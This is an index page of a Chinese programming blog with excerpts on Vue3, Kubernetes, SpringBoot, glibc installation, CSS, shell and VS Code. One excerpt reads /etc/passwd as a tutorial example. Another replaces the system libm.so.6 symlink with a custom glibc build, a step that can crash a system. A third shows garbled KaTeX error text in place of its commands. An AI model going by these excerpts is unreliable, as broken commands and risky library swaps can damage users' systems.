<!DOCTYPE html>
<html class="no-js" lang="en">
<head>
	<meta name="generator" content="Hugo 0.121.1">
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<title>编程爱好者博客</title>
	<script>(function(d,e){d[e]=d[e].replace("no-js","js");})(document.documentElement,"className");</script>
	<meta name="description" content="编程爱好者博客">
		<meta property="og:title" content="编程爱好者博客" />
<meta property="og:description" content="编程爱好者博客" />
<meta property="og:type" content="website" />
<meta property="og:url" content="https://bchobby.github.io/" />


	<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
	<link rel="dns-prefetch" href="//fonts.googleapis.com">
	<link rel="dns-prefetch" href="//fonts.gstatic.com">
	<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Open+Sans:400,400i,700">

	<link rel="stylesheet" href="/css/style.css">
	
	<link rel="alternate" type="application/rss+xml" href="/index.xml" title="编程爱好者博客">

	<link rel="shortcut icon" href="/favicon.ico">
		
</head>
<body class="body">
	<div class="container container--outer">
		<header class="header">
	<div class="container header__container">
		
	<div class="logo">
		<a class="logo__link" href="/" title="编程爱好者博客" rel="home">
			<div class="logo__item logo__text">
					<div class="logo__title">编程爱好者博客</div>
					
				</div>
		</a>
	</div>
		<div class="divider"></div>
	</div>
</header>
		<div class="wrapper flex">
			<div class="primary">
			
<main class="main list" role="main">
	<article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/64908e8fd74ede22c8a8e2c2d50affd9/" rel="bookmark">
			Vue3&#43;Vite&#43;AntDesign&#43;Axios&#43;Unocss 太爽了，直接上手和后端对接-适合白嫖
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		发现新大陆，大厂前端架构师搭建的后台管理框架，使用都是热门的前端技术栈；只会后端的我直接拿来入手练习项目，与后端接口对接分分钟完成。 所用技术栈： vue3
ant-design-vue
unocss
axios
echarts
pinia
unplugin-vue-jsx
vue-router
typescript
unplugin-auto-import
unplugin-vue-components
效果图： 关于每个技术点的优势总结： 以下观点纯属个人对此框架的使用过程中的理解；
vue3 vue3的setup语法糖和组合式api的使用；其中主要是ref函数 和 reactive函数 的使用，对象的定义不再需要像vue2之前的写法，可以将变量像js的原生写法一样，统一定义在最顶部，方便查看和管理；总体来说vue3的写法，让开发人员可以比较个性化的编写自己的代码规则；
Unocss 页面CSS简化利器，传统的css编写都需要在Style标签内定好，使用Unocss可以在组件上直接定义，且兼容效果也很好；嘿嘿，前提还好需要有css基础的人使用起来才可以得心应手！
看以下代码达到的是同样效果；
原生CSS格式：
.demo{ margin: 1px width: 1px height: 1px } &lt;div class="demo"&gt; &lt;/div&gt; CSS框架：
&lt;div m-1px w-1px h-1px&gt; &lt;/div&gt; Unocss框架的编写格式首次接触肯定会不适应，这里还提供了一个格式写法工具可以学习：
https://uno.antfu.me/
只需要输入css的相关属性，系统会自动提示编写格式
资料参考文献：https://zhuanlan.zhihu.com/p/425814828?utm_medium=social&amp;utm_oi=31225867665408
Axios 框架内做了二次封装，灵活的支持多种请求方式（POST/GET/DELETE/PUT等），且做了token认证授权，登录拦截；且还有每种请求方式的调用示例，这就很方便了。
Pinia Vue新一代状态管理插件Pinia，这比vue的Store是方便和直观多了。使用它之后，以后就不用Store的写法了。
优点：
使用直观，编写store更加容易
完整的 TypeScript 支持
Pinia的体积极小，包体积仅为约1kb
抛弃了Vuex中的Mutation，使用action支持同步和异步
官方地址：https://pinia.web3doc.top/
unplugin-auto-import 和 unplugin-vue-components 两个都是提高开发效率的插件，自动引入插件/组件；当你编写一个组件之后，vue写法是在你需要使用的页面都要使用import 进行手动导入；而配置以上两个插件之后，你只需要告诉他哪个文件夹需要进行自动导入组件，之后在需要使用的页面，直接写文件名即可引入组件；
自动导入组件主要配置；vite.config.ts
import { fileURLToPath, URL } from 'node:url'; import { defineConfig } from 'vite'; import vue from '@vitejs/plugin-vue'; import Unocss from 'unocss/vite'; import AutoImport from 'unplugin-auto-import/vite'; import Components from 'unplugin-vue-components/vite'; import { AntDesignVueResolver } from 'unplugin-vue-components/resolvers'; import PxToRem from '.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/64908e8fd74ede22c8a8e2c2d50affd9/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/7dfc90f92e858a28615d5d43e16706ed/" rel="bookmark">
			软考高级-系统分析师-案例分析-系统规划
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		系分-案例分析-系统规划 软件可行性分析成本效益分析 - 盈亏临界分析成本效益分析 - 净现值分析现值净现值净现值率 成本效益分析 - 投资回收期案例 - 系统规划 - 典型例题1案例 - 系统规划 - 典型例题2 软件可行性分析 软件系统可行性分析包括哪几个方面？用 200 以内文字说明其含义。
经济可行性：主要评估项目的建设成本、运行成本和项目建成后可能的经济收益。技术可行性：主要评估信息系统需要实现的功能和性能，以及技术能力约束。法律可行性：需要从政策、法律、道德、制度等社会因素来论证信息系统建设的现实性。用户使用可行性：从信息系统用户的角度来评估系统的可行性，包括企业的行政管理和工作制度、使用人员的素质和培训要求等。 成本效益分析 - 盈亏临界分析 销售额 = 固定成本 + 可变成本 + 税费 + 利润 （正常情况下）销售额 = 固定成本 + 可变成本 + 税费 （盈亏平衡时） 例子：某公司去年卖了25000台电脑，每台售价2500，固定成本250万，可变成本4000万，税率16%。请计算卖多少台开始盈利
根据上面的公式可知：25002.5【销售额】 = 250 + 4000 + （25002.5）*16% + 利润
盈亏平衡时：
固定成本：250万可变成本：（4000 / 25002.5） 销售额 = 0.64销售额 （可变成本是随着销售量的变化而变化的）税费：0.16销售额 设 盈亏平衡时销售额为x万元
x = 250 + 0.64x + 0.16x
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/7dfc90f92e858a28615d5d43e16706ed/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/964709f86e456e184bc79ee863fbc4d3/" rel="bookmark">
			k8s中Namespace，pod区别
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		可参考：
kubernetes之Namespace，pod简述
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/78a3dd294529f1ea0840390f238f22c8/" rel="bookmark">
			k8s使用hostpath卷持久化数据
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		为什么需要数据卷？
容器中的文件在磁盘上是临时存放的，这给容器中运行比较重要的应用程序带来一些问题。 • 问题1：当容器升级或者崩溃时，kubelet会重建容器，容器内文件会丢失
• 问题2：一个Pod中运行多个容器需要共享文件 Kubernetes 卷（Volume） 这一抽象概念能够解决这两个问题。
hostPath卷：挂载Node文件系统（Pod所在节点）上文件或者目 录到Pod中的容器。
应用场景：Pod中容器需要访问宿主机文件
在yaml文件中：
apiVersion: apps/v1 kind: Deployment metadata: name: htf-unify-data-service namespace: prod labels: app: htf-unify-data-service annotations: deployment.kubernetes.io/revision: "1" spec: selector: matchLabels: app: htf-unify-data-service replicas: 2 strategy: type: RollingUpdate rollingUpdate: maxUnavailable: 0 maxSurge: 1 template: metadata: labels: app: htf-unify-data-service spec: nodeSelector: type: network containers: - name: htf-unify-data-service image: k8s-registry.qhtx.local/haitong/htf-unify-data-service-0.0.6-snapshot:7574 imagePullPolicy: Always resources: requests: cpu: 200m memory: 1000Mi limits: cpu: 8000m memory: 10000Mi ports: - name: http containerPort: 8080 protocol: TCP env: - name: LANG value: en_US.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/78a3dd294529f1ea0840390f238f22c8/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/9ad981d86365568086663646f2dfb27a/" rel="bookmark">
			SpringBoot——使用Filter过滤器
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		过滤器Filter可以在controller处理逻辑之前和之后加入一些其他逻辑，可以在controller之前进行验证和信息处理，或者在controller之后进行统计记录。过滤器可以设置过滤路径，多个过滤器也可以指定过滤顺序；
过滤器可以实现一个接口类javax.servlet.Filter:
实现接口中的三个方法：
init：过滤器初始化操作，springboot启动的时候调用；doFilter：过滤处理逻辑；destroy：过滤器销毁操作，项目结束停止的时候调用； 注：doFilter方法里有个FilterChain参数，在过滤逻辑里需要手动调用chain.doFilter(request, response)才会往下处理其他过滤器和controller；
可以使用三种方法配置过滤器：
1.使用@Component过滤所有url地址 只需要实现Filter接口，实现接口里必要的doFilter方法（init和destroy方法是接口里的默认方法），实现类使用@Component修饰就可以了；
启动类，使用的默认配置，端口8080，本机ip是192.168.1.30：
/** * 2023年3月10日下午3:51:13 */ package testspringboot.test8filter; import org.springframework.boot.SpringApplication; import org.springframework.boot.autoconfigure.SpringBootApplication; /** * @author XWF * */ @SpringBootApplication public class Test8Main { /** * @param args */ public static void main(String[] args) { SpringApplication.run(Test8Main.class, args); } } controller类：
/** * 2023年3月10日下午4:05:24 */ package testspringboot.test8filter; import org.springframework.web.bind.annotation.RequestMapping; import org.springframework.web.bind.annotation.RestController; /** * @author XWF * */ @RestController @RequestMapping("/filter") public class MyController { @RequestMapping("
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/9ad981d86365568086663646f2dfb27a/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/13a4b0d48f1b398d53fd9ffc43b4580a/" rel="bookmark">
			使用模拟器出现系统开启Hyper-v导致不能运行，Win10如何禁用 Hyper-V
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		https://bbs.xyaz.cn/forum.php?mod=viewthread&amp;tid=384770
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/80ce5af08e4bd4fc801ee48fc7e9f3a6/" rel="bookmark">
			爱了！阿里技术官亲笔的 Java 快速面试指南，熬夜啃完剑指大厂
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		今年互联网行业的行情不是很好，危机面前，持续的提高自己才是王道，提前准备下面试，有备无患。这里准备了一份 Java 后端面试指南，初衷也很简单，就是希望在面试的时候能够帮助到大家，减轻大家的负担和节省时间，帮助有需要的朋友收获高薪 offer。
Java-review-Gudie 【Java 快速面试指南目录】Java 基础、异常、集合、并发编程、JVM、Spring 全家桶、MyBatis、Redis、数据库、中间件 MQ、Dubbo、Linux、Tomcat、ZooKeeper、Netty 等等。包含了作为一个 Java 工程师在面试中需要用到或者可能用到的绝大部分知识！
Java 基础
Java 集合容器
Java 异常
Error 和 Exception 区别是什么?
运行时异常和—般异常(受检异常)区别是什么?
JVM 是如何处理异常的?
throw 和 throws 的区别是什么?
final、finally、finalize 有什么区别?
NoClassDefFoundError 和 ClassNotFoundException 区别?
try-catch-finally 中哪个部分可以省略?
try-catch-finally 中，如果 catch 中 return 了,finally 还会执行吗?
...
并发编程
并发基础
并发理论
并发关键字
并发容器
线程池
JVM
JVM 内存区域
内存溢出异常
垃圾收集器
内存分配策略
类加载机制
JVM 调优
Spring
spring 概述
Spring 控制反转（IOC）
SpringBean
Spring 注解
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/80ce5af08e4bd4fc801ee48fc7e9f3a6/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/904ebcfa0c27a1940e5bd46bcbe2e750/" rel="bookmark">
			Jmete多组件组合实战应用
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		Jmete多组件组合实战应用 1.案例图
2.业务场景
场景描述：使用不同人员进行数据充值
（1）用计数器来控制接口中的参数 按照固定的数值去递增 从0开始 每次增加500 无数值上线
（2）获取不同用户的token并传递给其他线程组 使用正则表达式提取器提取登录成功后的token信息，使用调试后置处理程序查看数值是否提取成功，使用BeanShell 后置处理程序用于提取token的数值传递给其他线程组，在其他线程组中使用${__property(newtoken,)}调用设置的token数据，使用固定定时器来模拟请求的间隔，使用查看结果树查看接口运行是否正确，使用聚合报告查看性能测试整体结果。
（3）HTTP请求默认值用于存放公共请求的ip地址，请求协议等，读取公共的请求参数使用CSV数据文件设置，使用cookie的数据需要添加HTTP Cookie管理器，HTTP请求头放在HTTP信息头管理器组件中。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/89e68b1172d6acc1850cd53429bfeebe/" rel="bookmark">
			在VMware中创建虚拟机
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		本文使用的VMware版本为VMware Workstation Pro 17
1、选择文件–&gt;新建虚拟机
2、选择自定义（自定义配置更详细，要求不高的选典型也可）
3、硬件兼容性默认即可
4、稍后安装操作系统
5、选择自己需要安装的系统及版本
6、根据需求更改虚拟机名称及存放位置（不建议存系统盘，可以在其他盘单独创建一个目录存放虚拟机，每台虚拟机也需要单独创建文件存放，之后也方便移动。创建的虚拟机是可以持续使用的，换电脑换硬盘都可以将文件拷贝到新位置，用VMware打开即可）
7、处理器配置根据需求选择，没特别要求的默认即可
8、内存配置一般情况默认，电脑内存小的也可以调到最低推荐内存
9、网络类型根据需求选择，NAT模式可以连接外部网络；仅主机模式使用主机虚拟网络，可以建立内部局域网。使用中也可以随时修改。
10、I/0控制器类型默认
11、磁盘类型根据需求选择，若是对虚拟机性能没要求就可以选择SCSI（S），若是想要性能好点可以用NVMe(V)。
创建新虚拟磁盘；
磁盘大小根据使用需求设置，使用少的默认就行；尽量不要勾选立即分配所有磁盘空间，勾选后系统文件就会立即占用硬盘空间20G，不勾选文件大小就会随着使用情况增加。
磁盘文件默认
12、选择自定义硬件–&gt;CD/DVD连接选择使用ISO映像文件–&gt;地址指向需要安装的系统的镜像文件位置（系统镜像自行在网上下载）–&gt;关闭–&gt;完成
13.开启虚拟机安装操作系统即可
**使用中可以根据需求随时编辑虚拟机的设置
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/16c925661df684528e0fc7d152341362/" rel="bookmark">
			若依框架RuoYi项目运行启动教程【傻瓜式教程】
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		💂 个人网站:【紫陌】【笔记分享网】
💅 想寻找共同学习交流、共同成长的伙伴，请点击【前端学习交流群】
启动若依项目 1.官网下载代码 若依官网
若依在线文档
首先去官网下载代码
链接到码云下载，要么用git下载要么压缩包下载。
然后再IDEA打开项目
想要运行就要搭建好环境
2.搭建若依环境 按照文档要求配置环境
JDK &gt;= 1.8 (推荐1.8版本) Mysql &gt;= 5.7.0 (推荐5.7版本) Maven &gt;= 3.0 node &gt;= 12.0 Redis &gt;= 5 这些准备好了就可以开始运行了
首先创建mysql数据库并且导入数据 然后导入数据
SQL文件位置
创建数据库并且导入
导入成功就有很多表，mysql就配置完毕
现在配置Redis 下载Redis开启服务
有着图标就是开启成功
打开客户端管理工具
数据库就配置完成了。
3.运行java启动文件 在这个文件运行就可以了
出现这个表示后端运行成功了
在浏览器运行，这也表示后端运行ok的。
4.运行前端 切换到ruoyi-ui目录的终端运行 npm i 下载所有依赖
我改了后端端口号，前端也要改，你们默认8080，后端没改这里也不用改。忽略这一步。
下载完毕运行 npm run dev
然后打开看到有验证码显示就是前后搭建成功。
这样就大功告成了
制作不易，帮助到你麻烦点个赞！！！！
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/0a7d5884a4fc08ff26ca5971d1f200f1/" rel="bookmark">
			ubuntu安装glibc
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		Ubuntu下安装glibc 1. 安装/升级glibc2. launch.json中添加路径映射3. 调试 VSCode在ubuntu下调试无法打开libc-start.c raise.c等,一般是由于系统glibc未安装或者版本不对。
1. 安装/升级glibc 方法一（原地法）：
apt-get install glibc-source cd /usr/src/glibc/ sudo tar -xvf glibc-[VERSION].tar.xz 方法二（共存法）：
apt源不支持更高版本的glibc时也可采用此方法，如ubuntu18.04不支持glibc-2.29。
查看glibc版本：
ldd --version 安装
wget http://ftp.gnu.org/pub/gnu/glibc/glibc-2.29.tar.gz tar -zxf glibc-2.29.tar.gz cd glibc-2.29 mkdir build &amp;&amp; cd build apt-get install gawk bison -y ../configure --prefix=/usr/local/glibc-2.29 make -j4 make install 注：
configure最好不要加--with-headers参数，否则会遇到一些问题，因为这个参数指定make在该目录下查找库，参考linux下安装glibc-2.14——zhj失落之地CSDNinstall后不可直接删除旧版软链接，如libm.so.6等，否则会导致系统崩溃。应备份后创建同名软连接指向新版：mv /lib/x86_64-linux-gnu/libm.so.6 /lib/x86_64-linux-gnu/libm.so.6.bak ln -s /usr/local/glibc-2.29/lib/libm.so.6 /lib/x86_64-linux-gnu/libm.so.6 这里mv命令我是直接复制我执行的命令，说明mv是可以的，但鉴于评论区有人反馈出问题，所以稳妥考虑，大家可以改用cp命令 2. launch.json中添加路径映射 "sourceFileMap": { "/build/glibc-S7xCS9": "/usr/src/glibc" } 注意修改 S&amp;xCS9 为报错提示中出现的glibc文件名 3. 调试 F5开启调试
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/0a7d5884a4fc08ff26ca5971d1f200f1/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/52b9edba67a040d782cf776ba554d711/" rel="bookmark">
			SpringCloud官方、Netflix、Alibaba组件整理
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 Spring Cloud官方NetflixAlibaba配置中心Spring Cloud ConfigArchaiusNacos注册中心EurekaNacos服务调用Spring Cloud OpenFeign、RestTemplateFeignDubbo负载均衡Spring Cloud Load BalancerRibbonDubbo服务容错HystrixSentinelAPI网关Spring Cloud GatewayZuul消息驱动Spring Cloud Stream RabbitMQ/KafkaSpring Cloud Stream RocketMQ事件总线Spring Cloud BusSpring Cloud Bus RocketMQ链路追踪Spring Cloud Sleuth分布式事务Seata分布式调度SchedulerX 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/4a15c6466aa59acba7749ce6dec9a395/" rel="bookmark">
			CSS基本知识点总结
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		1、CSS简介 1.1、CSS是什么？ CSS指的是层叠样式表（Cascading Style Sheets）CSS描述了如何在屏幕、纸张或其他媒体上显示HTML元素CSS节省了大量工作。它可以同时控制多张网页布局。 1.2、CSS引入方式 引入方式书写位置作用范围使用场景内嵌式CSS写在style标签中。style标签通常放在head中当前页面小案例外联式CSS写在单独的CSS文件中，通过link标签引入多个页面项目中行内式CSS写在标签的style属性中当前标签配合js使用 2、CSS选择器 2.1、CSS基础选择器 2.1.1 ID选择器 结构：#id属性值 { css属性名: 属性值; }作用：通过id属性值，找到页面中带有这个id属性值的标签，设置样式 注意点：
所有标签上都有id属性id属性值类似于身份证号码，在一个页面中是唯一的，不可重复的一个标签上只能有一个id属性值一个id选择器只能选中一个标签 2.1.2 类选择器 结构：.class { css属性名: 属性值; }作用：通过类名，找到页面中所有带有这个类名的标签，设置样式 注意点：
所有标签上都有class属性，class属性的属性值成为类名类名可以由数字、字母、下划线、中划线组成，但不能以数字或中划线开头一个标签可以同时有多个类名，类名之前以空格隔开类名可以重复，一个类选择器可以同时选中多个标签 2.1.3 通配符选择器 结构：* { css属性名: 属性值; }作用：找到页面中所有的标签，设置样式 注意点：默认去除浏览器自带属性margin和padding
2.1.4 标签选择器 结构：标签名 { css属性名: 属性值; }作用：通过标签名，找到页面中所有这类标签，设置样式 注意点：
标签选择器选择的是一类标签，而不是单独某一个标签选择器无论嵌套关系有多深，都能找到对应的标签 2.1.5 属性选择器 属性说明[attribute]选择多有带 attribute 属性的元素[attribute=value]选择 attribute=value的所有元素[attribute~=value]选择 attribute属性包含单词 value的所有元素[attribute^=value]选择其attribute属性值以value开头的所有元素[attribute$=value]选择其attribute属性值以 value结束的所有元素[attribute*=value]选择其attribute属性中包含value子串的每个元素 结构：标签名 { css属性名: 属性值; }作用：通过标签名，找到页面中所有这类标签，设置样式 注意点：
标签选择器选择的是一类标签，而不是单独某一个标签选择器无论嵌套关系有多深，都能找到对应的标签 2.2、组合选择器 选择器作用格式示例后代选择器找后代选择器之间通过空格分隔.father .son { css }子代选择器找儿子选择器之间通过 &gt;分隔.father &gt; .son { css }并集选择器找到多类元素选择器之间通过,分隔div,p,span { css }交集选择器找同时满足多个选择器的元素选择器之间紧挨着p.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/4a15c6466aa59acba7749ce6dec9a395/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/ddab89b163e6db9c8e50c01a33efe8f9/" rel="bookmark">
			路径规划算法之栅格地图绘制
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		来源 | 古月居
01 数据地图
1.1 地图类型
1.2 栅格地图表示方式
a. 本栏路径规划利用矩阵（二维数组）来表示栅格地图（因为对于矩阵，无论MATLAB、C++还是Python，矩阵更适合数组的表达，更便于编程。）
b. 矩阵表示地图与传统意识中坐标X,Y有所区别。
如图所示的地图，在矩阵表示中，起点位置为[3,1]，终点为[3,5]，三个障碍物分别为[2,3],[3,3]和[4,3]。在坐标表示中，起点位置为(1,2)，终点为(5,2)，三个障碍物分别为(3,1),(3,2)和(3,3)
c. 矩阵表示地图还可以用线性索引来简化，这样将矩阵的二维数组表示成一位数组，编程更方便。
Tips：线性索引，是从第一列开始，沿着行按顺序增长，然后从第二列开始…，是竖着沿行增长的，而非横着沿着列增长。理解记忆有点类似于Excel表格按行递增。
02 位置的表示方法的区分
2.1 在栅格地图上绘制xy点发生的情况
对于程序
clear;close all; rows = 4; cols = 5; % 地图行列尺寸 % 设置地图属性 field = ones(rows, cols); field(1,3) = 4; % 栅格矩阵表示1,3位置图像 % 颜色表征矩阵 cmap = [1 1 1; ... % 1-白色-空地 0 0 0; ... % 2-黑色-静态障碍 1 0 0; ... % 3-红色-动态障碍 1 1 0;... % 4-黄色-起始点 1 0 1;.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/ddab89b163e6db9c8e50c01a33efe8f9/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/eae9e3bc28fb18097c415f2356562667/" rel="bookmark">
			shell编程之变量置换
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		命令替换 取命令结果用。把命令的结果拿出来
[root@linux-server ~]# a=date +%m%d
[root@linux-server ~]# echo KaTeX parse error: Expected 'EOF', got '#' at position 29: …linux-server ~]#̲ a=(date +%m-%d)
[root@linux-server ~]# echo $a
12-25
#反引号亦可用$() 代替
变量替换 一 ${parameter:-word}
若 parameter 为空或未设置，则用 word 代替 parameter 进行替换，parameter 的值不变,若 parameter 不为空，则不替换，parameter 的值不变
#unset b
#echo ${b:-3}
-3
#echo $b
二 ${parameter:=word}
若 parameter 为空或未设置，则用 word 代替 parameter 进行替换，parameter 的值改变,若 parameter设置了，则不替换,parameter的值不变
#unset b
#echo ${b:=3}
3
#echo $b
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/eae9e3bc28fb18097c415f2356562667/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/dd51cc39ae293369cef87336e66ec1c0/" rel="bookmark">
			Linux——使用Bash shell执行命令
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		一、基本命令语法： 命令、选项（通常以-或--开头）、参数（每个词语通过空格相互隔开，若希望在一行中键入多个命令，使用分号（；）作为分隔符） 二、简单命令：
（1）date：显示当前日期和时间；超级用户用来设置系统时钟，以加号（+）开头的参数可指定日
期命令的格式字符串
（2）passwd：更改用户自己的密码；超级用户可更改其他用户密码
（3）file：扫描文件内容开头，显示文件类型
（4）tab补全：允许用户在提示符下快速补全命令或文件名，如果字符不唯一，则可键入两次显示
（5）反斜杠字符（\）转义字符：在另一行上继续命令
（6）辅助提示符（&gt;）延续提示符：延续很多行
（7）history：显示之前执行的命令的列表，带有命令编号作为前缀
（8）感叹号字符（！）：扩展之前的命令而不必重新键入它们
（9）！number：扩展至与指定编号匹配的命令
（10）！string：扩展至最近一个以指定字符串开头的命令
（11）↑和↓：可编辑历史列表中上一个或下一个命令
（12）←和→：左右移动光标
（13）Esc+.或Alt+.组合键：在光标的当前位置插入一个命令的最后一个单词，Alt+.使用起来会更加方便
（14）who、whoami、w：怎么显示当前登录的用户？
三、查看文件内容的命令： （1）cat：创建单一或多个文件，查看文件内容，串联多个文件的内容，将文件内容重新定向到终端或文件
（2）less：一次显示文件的一个页面，可以随意滚动显示；cat命令不会将文件的内容显示为多个页面，less命令允许在篇幅超过一个终端窗口适合大小的文件中向前和向后翻页，使用↑和↓可向上和向下滚动显示，q键退出
（3）more：按页显示文件内容，空格键向下翻页，支持直接跳转行
（4）head和tail：分别显示文件开头和结尾，默认显示10行，使用-n选项，可以指定行数，
例如：tail –n 3 /etc/passwd
（5）wc：计算文件中行、字、字符数量，接受-l，-w，-c选项，分别显示行数、字数、字符数
四、bash编辑命令行： ctrl+A跳到命令行的开头ctrl+E跳到命令行的末尾ctrl+U将光标处到命令行开头的内容清除ctrl+K将光标处到命令行末尾的内容清除ctrl+向左箭头跳到命令行中前一字的开头ctrl+向右箭头跳到命令行中下一字的末尾ctrl+R在历史记录中搜索某一模式的命令
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/8ded8af8b947f66dafe3f28f6d99731a/" rel="bookmark">
			vscode下载与使用
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		目录
1.vscode下载
2.推荐插件
2.1.Remote - SSH插件
2.2.Chinese(Simplified)插件
2.3.C/C++相关插件
2.4.Include AutoComplete插件
2.5.GBKtoUTF8插件
2.6.vscode-icons
2.7.koroFileHeader
2.8.GDB Debug
1.vscode下载 官网下载地址： Download Visual Studio Code - Mac, Linux, Windows 下载太慢，推荐文章： 解决VsCode下载慢问题_vscode下载太慢_迷小圈的博客-CSDN博客 下载太慢，推荐下载链接： https://vscode.cdn.azure.cn/stable/30d9c6cd9483b2cc586687151bcbcd635f373630/VSCodeUserSetup-x64-1.68.1.exe 2.推荐插件 2.1.Remote - SSH插件 介绍：远程登录操作Linux服务器的工具
下载：如下图所示，点击拓展按钮搜索Remote - SSH，点击安装即可。
链接远程主机：下载好之后左边会新增一个远程资源管理器，点击远程资源管理器点击加号Add New，点击F1输入 remote-ssh 然后回车，然后输入 ssh 用户名@主机IP地址 并回车，点击弹出来的......\.ssh\config，此时弹出添加主机成功的提示符，点击Open Config按钮，可以看到Config配置文件内容，此时左边的SSH TARGETS栏中显示了我们添加的主机。
注：主机IP地址可以在对应服务器官网查到，也可以在Xshell的会话框中查找，如下图一二所示。
删除远程主机的链接：点击远程资源管理器点击设置按钮，点击弹出来的......\.ssh\config，将打开的配置文件中对应主机IP地址和用户名删除，然后关闭并保存文件，对应远程主机链接就取消了。
登录远程主机：
右击SSH TARGETS栏中我们添加的主机，选择connect to Host Windows，选择Linux并选择continue，输入对应用户的密码并回车，此时进行链接，如果SSH TARGETS栏中我们添加的主机图标有绿色的对勾，说明链接成功。
通过Remote - SSH远程操作：
使用xshell登录dxf用户，创建一个test_vscode目录，如下图一所示。
远程登陆主机后(绑定的dxf用户)，点击打开文件夹，可以看到自动填充好了dxf用户在远端机器前面的路径，选择刚刚新建的目录test_vscode点击确定，输入dxf用户的登录密码后提示是否信任的图标，选择信任即可，如下图二所示。
经过上面的操作，在新窗口的远程资源管理器中有了TEST_VSCODE，在旧窗口的远程资源管理器中显示当前vscode在服务器中的路径，如下图三所示。
此时vscode在远端服务器的/home/dxf/test_vscode目录下，如下图一所示，点击新建文件夹，输入test.c新建文件夹名创建文件然后回车，在test.c文件中输入下图二所示的代码，ctrl+s保存，点击新建文件夹，输入test.cpp新建文件夹名创建文件，在test.cpp文件中输入下图三所示的代码，ctrl+s保存。此时打开xshell在test_vscode目录下可以看到新创建的两个文件，如下图四所示。
此时在vscode编辑文件代码ctrl+s保存后，在xshell打开对应文件可以看到编辑后的代码；在xshell中使用vim编辑文件代码wq保存后，在vscode打开对应文件也可以看到编辑后的代码。
点击新建文件夹，创建makefile文件，在makefile文件中输入下图一所示的代码，然后ctrl+s保存。此时可以在xshell中使用make命令生成可执行程序然后./mycode运行，如下图二所示。此时也可以在vscode中 ctrl+~ 打开vscode中内置命令行，然后使用make命令生成可执行程序然后./mycode运行，如下图三所示。
2.2.Chinese(Simplified)插件 介绍：翻译工具
下载：如下图所示，点击拓展按钮搜索Chinese(Simplified)，点击安装即可。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/8ded8af8b947f66dafe3f28f6d99731a/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/a04a0cf88886e0b8412e5aa27364a54b/" rel="bookmark">
			全景插件 Photo sphere viewer
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
